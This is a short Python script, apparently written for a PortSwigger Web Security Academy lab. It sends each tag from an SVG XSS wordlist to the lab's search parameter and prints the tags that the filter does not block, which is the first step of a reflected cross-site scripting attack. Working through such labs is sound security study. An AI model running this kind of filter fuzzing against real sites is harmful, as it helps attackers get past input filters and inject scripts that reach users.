import requests

lab_id = 'ac211fc51faa80dd80fd049c00d000d4'
f = open('wordlists/xss-svg.txt')

for tag in f:
    # response = requests.get('https://'+lab_id+'.web-security-academy.net/?search=<svg '+event+'>')
    response = requests.get('https://'+lab_id+'.web-security-academy.net/?search=<'+tag+'>')

    if 'Tag is not allowed' not in response.text:
        print(tag,end='')

